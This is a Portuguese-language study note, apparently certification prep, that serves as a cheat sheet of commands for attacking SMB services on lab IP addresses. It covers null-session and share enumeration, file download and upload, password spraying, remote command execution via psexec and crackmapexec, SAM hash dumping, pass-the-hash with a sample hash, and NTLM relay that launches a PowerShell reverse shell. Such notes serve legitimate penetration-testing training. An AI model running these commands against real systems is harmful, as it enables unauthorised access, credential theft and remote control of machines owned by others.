> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/smb.md).

# SMB

Server Message Block (SMB) é um protocolo de comunicação criado para fornecer acesso compartilhado a arquivos e impressoras entre nós em uma rede. Inicialmente, ele foi projetado para rodar em cima do NetBIOS sobre TCP/IP (NBT) usando porta TCP `139`e portas UDP `137`e `138`.&#x20;

* Teste de sessão nula no serviço SMB.

```sh
smbclient -N -L //10.129.14.128
```

* Enumeração de compartilhamento de rede usando `smbmap`.

```sh
smbmap -H 10.129.14.128
```

* Enumeração de compartilhamento de rede recursiva usando `smbmap`.

```sh
smbmap -H 10.129.14.128 -r notes
```

* Baixe um arquivo específico da pasta compartilhada.

```sh
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

* Carregue um arquivo específico para a pasta compartilhada.

```sh
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

* Sessão nula com o `rpcclient`.

```sh
rpcclient -U'%' 10.10.110.17
```

* Enumeração automatizada do serviço SMB usando `enum4linux-ng`.

```sh
./enum4linux-ng.py 10.10.11.45 -A -C
```

* Pulverização de senhas contra diferentes usuários de uma lista.

```sh
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'
```

* Conecte-se ao serviço SMB usando o `impacket-psexec`.

```sh
impacket-psexec administrator:'Password123!'@10.10.110.17
```

* Execute um comando no serviço SMB usando `crackmapexec`.

```sh
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

* Enumerando usuários conectados.

```sh
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

* Extraia hashes do banco de dados SAM.

```sh
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

* Use a técnica Pass-The-Hash para autenticar no host de destino.

```sh
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

* Despeje o banco de dados SAM usando `impacket-ntlmrelayx`.

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

* Execute um shell reverso baseado em PowerShell usando `impacket-ntlmrelayx`.

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
```
